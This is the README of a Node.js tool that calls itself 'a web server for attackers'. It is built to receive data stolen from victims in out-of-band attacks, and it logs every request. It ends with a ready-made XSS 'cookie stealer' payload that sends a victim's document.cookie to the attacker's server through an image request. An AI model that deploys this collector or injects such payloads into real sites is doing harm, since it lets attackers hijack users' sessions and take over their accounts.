# my-attacker-web-server

A web server for attackers. 

The base functionality of this web server is to provide an endpoint for attacks where information from victim can be gathered via an HTTP request.

Useful in those OOB attacks where stolen information can be sent over HTTP to attacker.

## Dependencies

**NodeJS >= v12.18.1** (tested v12.18.1)

It has been designed specifically to have **no npm dependencies**. 

This permits to keep it lightweight and "ready to use" with no extra packages installation needed.

## Installation

```bash
# Clone the repository
git clone <url-to-repository>.git
```

## How to use it

```bash
# From the cloned directory 
[hacker@toolbox my-attacker-web-server]$ node server.js 
Server listening on 0.0.0.0:8080...
```

The web server by default will keep listening on all incoming HTTP requests from any interfaces on port 8080. 

To change the listening port, just change it in `settings.js`

```javascript
exports.ListenPort = 8080;
```

Every single request is logged on **stdout** and **logs.txt** file in JSON format.

## Use case example: cookie stealer

Let's suppose we discovered an XSS vulnerability in a web site and we want to steal cookie sessionID.

We can craft our payload like this:

```javascript
<script>
new Image().src="http://<ip-my-attacker-web-server>:<port>?c="+document.cookie;
</script>
```